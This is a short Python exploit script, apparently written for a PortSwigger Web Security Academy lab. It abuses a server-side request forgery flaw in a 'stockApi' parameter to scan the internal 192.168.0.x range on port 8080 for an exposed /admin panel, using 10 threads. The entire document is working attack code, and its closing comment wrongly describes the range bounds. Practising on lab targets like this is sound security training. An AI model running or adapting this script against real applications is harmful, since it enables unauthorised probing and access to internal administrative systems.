import requests
import concurrent.futures

SUBNET = "192.168.0."
PORT = "8080"
URL = "https://0af7002c03eee20d80ed442f0063009a.web-security-academy.net/product/stock"

def check_ip(ip_number):
    ip_address = f"{SUBNET}{ip_number}"
    post_data = {"stockApi": f"http://{ip_address}:{PORT}/admin"}

    response = requests.post(URL, data=post_data)

    if response.status_code == 200:
        print(f"IP Address {ip_address} returned HTTP 200 (OK)")

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(check_ip, range(1, 256))  # Loop through the sequence from 1 to 255 (255 is exclusive)
